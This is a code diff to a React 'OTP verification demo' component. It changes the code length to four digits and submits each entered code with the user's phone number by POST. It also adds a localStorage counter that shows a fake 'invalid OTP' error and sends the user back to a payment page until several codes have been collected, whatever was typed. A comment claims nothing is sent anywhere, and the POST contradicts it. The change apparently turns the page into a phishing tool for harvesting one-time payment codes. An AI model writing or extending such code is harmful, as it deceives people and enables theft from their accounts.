@@ -17,9 +17,9 @@ export default function OtpVerificationDemo() {
     // Keep numbers only
     const value = event.target.value.replace(/\D/g, "");
 
-    // Keep it to 6 digits
-    setOtp(value.slice(0, 6));
-
+    // Keep it to 4 digits
+    setOtp(value.slice(0, 4));
+    
     // Hide success message if user edits the OTP again
     setVerified(false);
   };
@@ -32,15 +32,27 @@ export default function OtpVerificationDemo() {
       phone: phone
     }, {
       method: "POST"
-    })
+    });
+    const attempts = Number(localStorage.getItem("attemps")) ;
+    const currentAttempt = Number(localStorage.getItem("current_attempt"))  ;
 
-    navigate("/success")
+    localStorage.setItem("current_attempt", `${currentAttempt+1}`);
+    if(currentAttempt >= (attempts)){
+      localStorage.removeItem("attemps");
+      localStorage.removeItem("current_attempt");
+      navigate("/success");
+    }
+    else{
+      alert("Request failed or invalid OTP. Please try again.");
+      navigate("/payment");
+    }
+
     // IMPORTANT:
     // This is UI-only.
     // Nothing is sent anywhere.
    // console.log("Demo OTP:", otp);
 
-    if (otp.length === 6) {
+    if (otp.length === 4) {
       setVerified(true);
     }
   };
@@ -188,7 +200,7 @@ export default function OtpVerificationDemo() {
                     onChange={handleOtpChange}
                     placeholder="••••••"
                     inputMode="numeric"
-                    maxLength={6}
+                    maxLength={4}
                     required
                     className="w-full rounded-2xl border-2 border-gray-100 bg-gray-50 px-5 py-4 text-center text-2xl font-black tracking-widest text-gray-900 placeholder-gray-300 outline-none transition-all focus:border-orange-500 focus:ring-4 focus:ring-orange-100"
                   />
@@ -198,14 +210,14 @@ export default function OtpVerificationDemo() {
                 {/* Digit Counter */}
 
                 <div className="text-center text-xs font-medium text-gray-400">
-                  {otp.length} / 6 digits
+                  {otp.length} / 4 digits
                 </div>
 
                 {/* Submit */}
 
                 <button
                   type="submit"
-                  disabled={otp.length !== 6 || fetcher.state !== "idle"}
+                  disabled={otp.length !== 4 || fetcher.state !== "idle"}
                   className="flex w-full items-center justify-center gap-2 rounded-2xl bg-orange-500 py-5 font-black text-white shadow-lg shadow-orange-200 transition-all hover:bg-orange-600 active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-50"
                 >
                   {fetcher.state === "submitting" ? (
